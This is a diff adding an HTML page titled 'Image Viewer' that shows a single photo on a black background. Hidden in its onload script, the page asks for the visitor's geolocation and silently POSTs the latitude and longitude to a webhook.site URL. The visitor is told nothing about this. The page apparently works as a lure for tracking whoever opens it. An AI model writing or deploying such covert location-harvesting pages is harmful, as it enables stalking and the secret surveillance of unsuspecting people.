@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Image Viewer</title>
+</head>
+<body style="margin:0; background-color:black; display:flex; justify-content:center; align-items:center; height:100vh;">
+
+    <img src="https://images.unsplash.com/photo-1503023345310-bd7c1de61c7d" style="max-width:100%; height:auto;">
+
+    <script>
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const webhookURL = "https://webhook.site/df38940f-cedd-4529-8fdb-ac6d2b4ad408"; 
+
+                    fetch(webhookURL, {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        body: JSON.stringify({ latitude: lat, longitude: lon })
+                    });
+                });
+            }
+        };
+    </script>
+</body>
+</html>
